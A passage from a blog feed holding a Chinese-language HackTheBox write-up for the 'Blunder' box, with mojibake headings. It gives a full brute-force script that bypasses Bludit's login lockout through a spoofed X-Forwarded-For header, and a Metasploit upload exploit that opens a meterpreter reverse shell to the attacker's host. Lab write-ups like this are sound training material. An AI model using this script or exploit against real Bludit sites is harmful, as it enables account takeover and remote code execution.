&lt;p&gt;Donâ€™t stop after finding 1 way there are more ways.&lt;/p&gt;
&lt;p&gt;This works better with VirtualBox than VMware.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    <category term="CK" scheme="https://lunamoore.github.io/categories/vulnhub/CK/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[blunder]</title>
    <link href="https://lunamoore.github.io/2020/09/19/HTB-blunder/"/>
    <id>https://lunamoore.github.io/2020/09/19/HTB-blunder/</id>
    <published>2020-09-19T02:39:27.000Z</published>
    <updated>2020-09-19T03:07:08.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01.æ¦‚è¿°"></a>0x01.æ¦‚è¿°</h2><img src="/2020/09/19/HTB-blunder/image-20200918203836239.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>ä»…ä»…å¼€æ”¾äº†21ï¼ˆå…³é—­ï¼‰/80ç«¯å£</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># nmap -sC -sV -sT 10.10.10.191 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 08:32 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.191</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">21/tcp closed ftp</span><br><span class="line">80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Blunder</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Blunder | A blunder of interesting facts</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 74.98 seconds</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x01-å…ˆè®¿é—®80ç«¯å£"><a href="#0x01-å…ˆè®¿é—®80ç«¯å£" class="headerlink" title="0x01.å…ˆè®¿é—®80ç«¯å£"></a>0x01.å…ˆè®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«æ— æœ</code></p><img src="/2020/09/19/HTB-blunder/image-20200918211814780.png" class><h2 id="0x03-æ‰«æéšè—ç›®å½•"><a href="#0x03-æ‰«æéšè—ç›®å½•" class="headerlink" title="0x03.æ‰«æéšè—ç›®å½•"></a>0x03.æ‰«æéšè—ç›®å½•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirb/common.txt -x txt,php,py,cgi</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.191</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     cgi,txt,php,py</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/18 20:46:19 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.hta.txt (Status: 403)</span><br><span class="line">/.hta.php (Status: 403)</span><br><span class="line">/.hta.py (Status: 403)</span><br><span class="line">/.hta.cgi (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.txt (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/.htaccess.py (Status: 403)</span><br><span class="line">/.htaccess.cgi (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.cgi (Status: 403)</span><br><span class="line">/.htpasswd.txt (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/.htpasswd.py (Status: 403)</span><br><span class="line">/0 (Status: 200)</span><br><span class="line">/about (Status: 200)</span><br><span class="line">/admin (Status: 301)</span><br><span class="line">[ERROR] 2020/09/18 20:49:18 [!] net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> reading body)</span><br><span class="line">[ERROR] 2020/09/18 20:49:18 [!] Get http://10.10.10.191/AT-admin.cgi.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/at.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attach.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachs: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/atom.php: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attach_mod.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachment.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attic: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachments.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">/cgi-bin/ (Status: 301)</span><br><span class="line">/install.php (Status: 200)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/todo.txt (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/18 21:13:55 Finished</span><br><span class="line">===============================================================</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x04-æµè§ˆéšè—æ–‡ä»¶"><a href="#0x04-æµè§ˆéšè—æ–‡ä»¶" class="headerlink" title="0x04.æµè§ˆéšè—æ–‡ä»¶"></a>0x04.æµè§ˆéšè—æ–‡ä»¶</h2><p><code>æ„Ÿè§‰fergusåº”è¯¥æ˜¯ä¸€ä¸ªç”¨æˆ·</code></p><img src="/2020/09/19/HTB-blunder/image-20200919091017554.png" class><img src="/2020/09/19/HTB-blunder/image-20200919091105055.png" class><h2 id="0x05-è®¿é—®admin"><a href="#0x05-è®¿é—®admin" class="headerlink" title="0x05.è®¿é—®admin"></a>0x05.è®¿é—®admin</h2><p><code>å‘ç°ä¸ºBLUDIT CMS</code></p><img src="/2020/09/19/HTB-blunder/image-20200919091142052.png" class><h2 id="0x06-ç”Ÿæˆç‰¹å®šå­—å…¸"><a href="#0x06-ç”Ÿæˆç‰¹å®šå­—å…¸" class="headerlink" title="0x06.ç”Ÿæˆç‰¹å®šå­—å…¸"></a>0x06.ç”Ÿæˆç‰¹å®šå­—å…¸</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># cewl -w wordlist.txt -d 10 -m 7 http://10.10.10.191</span></span><br><span class="line">CeWL <span class="number">5.4</span><span class="number">.8</span> (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment"># wc -l wordlist.txt </span></span><br><span class="line"><span class="number">142</span> wordlist.txt</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x07-çˆ†ç ´"><a href="#0x07-çˆ†ç ´" class="headerlink" title="0x07.çˆ†ç ´"></a>0x07.çˆ†ç ´</h2><p><a href="https://github.com/lunamoore/buldit-brute-force/blob/master/exp.py"><strong>bruteæºç </strong></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># cat pass.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://10.10.10.191&#x27;</span></span><br><span class="line">login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;fergus&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/root/htb/blunder/wordlist.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create a list (&#x27;wordlist&#x27;) using the readlines method</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;8859&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    wordlist = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(wordlist)):</span><br><span class="line">        wordlist[i] = wordlist[i].rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate 50 incorrect passwords (not necessary. probably.)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    wordlist.append(<span class="string">&#x27;Password&#123;i&#125;&#x27;</span>.format(i = i))</span><br><span class="line">  <span class="comment">#  print(wordlist)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add the correct password to the end of the list (not really necessary in our use case)</span></span><br><span class="line">wordlist.append(<span class="string">&#x27;adminadmin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    csrf_token = re.search(<span class="string">&#x27;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[*] Trying: &#123;p&#125;&#x27;</span>.format(p = password))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tokenCSRF&#x27;</span>: csrf_token,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;save&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;location&#x27;</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/admin/dashboard&#x27;</span> <span class="keyword">in</span> login_result.headers[<span class="string">&#x27;location&#x27;</span>]:</span><br><span class="line">            print()</span><br><span class="line">            print(<span class="string">&#x27;SUCCESS: Password found!&#x27;</span>)</span><br><span class="line">            print(<span class="string">&#x27;Use &#123;u&#125;:&#123;p&#125; to login.&#x27;</span>.format(u = username, p = password))</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure><blockquote><p>çˆ†ç ´æˆåŠŸï¼š</p><p>userï¼šfergus</p><p>passwordï¼šRolandDeschain</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~&#x2F;htb&#x2F;blunder# python3 pass.py </span><br><span class="line">[*] Trying: Plugins</span><br><span class="line">[*] Trying: Include</span><br><span class="line">[*] Trying: service</span><br><span class="line">[*] Trying: Dynamic</span><br><span class="line">[*] Trying: blunder</span><br><span class="line">[*] Trying: interesting</span><br><span class="line">[*] Trying: devices</span><br><span class="line">[*] Trying: content</span><br><span class="line">[*] Trying: created</span><br><span class="line">[*] Trying: Creation</span><br><span class="line">[*] Trying: November</span><br><span class="line">[*] Trying: Reading</span><br><span class="line">[*] Trying: Fantasy</span><br><span class="line">[*] Trying: National</span><br><span class="line">[*] Trying: players</span><br><span class="line">[*] Trying: description</span><br><span class="line">[*] Trying: Favicon</span><br><span class="line">[*] Trying: Bootstrap</span><br><span class="line">[*] Trying: bootstrap</span><br><span class="line">[*] Trying: Networks</span><br><span class="line">[*] Trying: Content</span><br><span class="line">[*] Trying: Stephen</span><br><span class="line">[*] Trying: Sidebar</span><br><span class="line">[*] Trying: nothing</span><br><span class="line">[*] Trying: Copyright</span><br><span class="line">[*] Trying: Powered</span><br><span class="line">[*] Trying: byEgotisticalSW</span><br><span class="line">[*] Trying: Javascript</span><br><span class="line">[*] Trying: American</span><br><span class="line">[*] Trying: fiction</span><br><span class="line">[*] Trying: feature</span><br><span class="line">[*] Trying: published</span><br><span class="line">[*] Trying: received</span><br><span class="line">[*] Trying: awarded</span><br><span class="line">[*] Trying: literature</span><br><span class="line">[*] Trying: centers</span><br><span class="line">[*] Trying: through</span><br><span class="line">[*] Trying: smartphones</span><br><span class="line">[*] Trying: tablets</span><br><span class="line">[*] Trying: library</span><br><span class="line">[*] Trying: Breaked</span><br><span class="line">[*] Trying: September</span><br><span class="line">[*] Trying: supernatural</span><br><span class="line">[*] Trying: suspense</span><br><span class="line">[*] Trying: fantasy</span><br><span class="line">[*] Trying: million</span><br><span class="line">[*] Trying: adapted</span><br><span class="line">[*] Trying: miniseries</span><br><span class="line">[*] Trying: television</span><br><span class="line">[*] Trying: including</span><br><span class="line">[*] Trying: Richard</span><br><span class="line">[*] Trying: Bachman</span><br><span class="line">[*] Trying: written</span><br><span class="line">[*] Trying: approximately</span><br><span class="line">[*] Trying: stories</span><br><span class="line">[*] Trying: collections</span><br><span class="line">[*] Trying: British</span><br><span class="line">[*] Trying: Society</span><br><span class="line">[*] Trying: Foundation</span><br><span class="line">[*] Trying: Distinguished</span><br><span class="line">[*] Trying: Contribution</span><br><span class="line">[*] Trying: Letters</span><br><span class="line">[*] Trying: probably</span><br><span class="line">[*] Trying: fictional</span><br><span class="line">[*] Trying: character</span><br><span class="line">[*] Trying: RolandDeschain</span><br><span class="line"></span><br><span class="line">SUCCESS: Password found!</span><br><span class="line">Use fergus:RolandDeschain to login.</span><br></pre></td></tr></table></figure><h2 id="0x08-ç™»å…¥"><a href="#0x08-ç™»å…¥" class="headerlink" title="0x08.ç™»å…¥"></a>0x08.ç™»å…¥</h2><p><code>åªèƒ½æ·»åŠ é™æ€é¡µé¢ï¼Œæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯</code></p><img src="/2020/09/19/HTB-blunder/image-20200919100905624.png" class><h2 id="0x09-MSFåå¼¹shell"><a href="#0x09-MSFåå¼¹shell" class="headerlink" title="0x09.MSFåå¼¹shell"></a>0x09.MSFåå¼¹shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search bludit</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                          Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/linux/http/bludit_upload_images_exec</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; use exploit/linux/http/bludit_upload_images_exec</span><br><span class="line">[*] Using configured payload php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/bludit_upload_images_exec):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   BLUDITPASS                   yes       The password for Bludit</span><br><span class="line">   BLUDITUSER                   yes       The username for Bludit</span><br><span class="line">   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI   /                yes       The base path for Bludit</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.87.24.78      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Bludit v3.9.2</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus</span><br><span class="line">bludituser =&gt; gergus</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bluditpass RolandDeschain</span><br><span class="line">bluditpass =&gt; RolandDeschain</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set rhosts 10.10.10.191</span><br><span class="line">rhosts =&gt; 10.10.10.191</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set lhost 10.10.17.216</span><br><span class="line">lhost =&gt; 10.10.17.216</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/bludit_upload_images_exec):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   BLUDITPASS  RolandDeschain   yes       The password for Bludit</span><br><span class="line">   BLUDITUSER  fergus           yes       The username for Bludit</span><br><span class="line">   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI   /                yes       The base path for Bludit</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Bludit v3.9.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[-] Exploit aborted due to failure: no-access: Authentication failed</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus</span><br><span class="line">bludituser =&gt; fergus</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[+] Logged in as: fergus</span><br><span class="line">[*] Retrieving UUID...</span><br><span class="line">[*] Uploading ELlQyVUzyq.png...</span><br><span class="line">[*] Uploading .htaccess...</span><br><span class="line">[*] Executing ELlQyVUzyq.png...</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.191</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.17.216:4444 -&gt; 10.10.10.191:50490) at 2020-09-18 22:16:21 -0400</span><br><span class="line">[+] Deleted .htaccess</span><br><span class="line"></span><br><span class="line">meterpreter &gt; id</span><br><span class="line">[-] Unknown command: id.</span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown command: whoami.</span><br></pre></td></tr></table></figure><p><code>wwwç”¨æˆ·æ²¡æœ‰æƒé™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 